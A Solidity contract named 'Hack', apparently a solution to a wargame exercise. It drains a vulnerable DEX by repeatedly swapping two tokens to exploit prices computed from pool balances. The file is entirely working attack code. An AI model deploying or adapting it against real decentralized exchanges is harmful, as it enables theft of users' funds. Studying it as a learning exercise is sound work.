// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IDex {
    function token1() external returns (address);

    function token2() external returns (address);

    function swap(address from, address to, uint amount) external;

    function approve(address spender, uint amount) external;

    function balanceOf(address token, address account) external view returns (uint);
}

interface IERC20 {
    function approve(address spender, uint amount) external;

    function balanceOf(address _owner) external view returns (uint256 balance);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract Hack {
    IDex private immutable dex;
    address public owner;

    IERC20 public token1;
    IERC20 public token2;

    constructor(address contractAddress) {
        dex = IDex(contractAddress);
        owner = msg.sender;
    }

    function setTokenAddress() public {
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
        token1.transferFrom(owner, address(this), 10);
        token2.transferFrom(owner, address(this), 10);
        dex.approve(address(dex), type(uint).max);
    }

    function attack() public {
        uint amountA = dex.balanceOf(address(token1), address(this));
        uint amountB = dex.balanceOf(address(token2), address(this));
        uint poolB = dex.balanceOf(address(token2), address(dex));

        if (poolB == 45) {
            dex.swap(address(token2), address(token1), 45);
        } else if (amountA >= amountB) {
            dex.swap(address(token1), address(token2), amountA);
        } else {
            dex.swap(address(token2), address(token1), amountB);
        }
    }
}
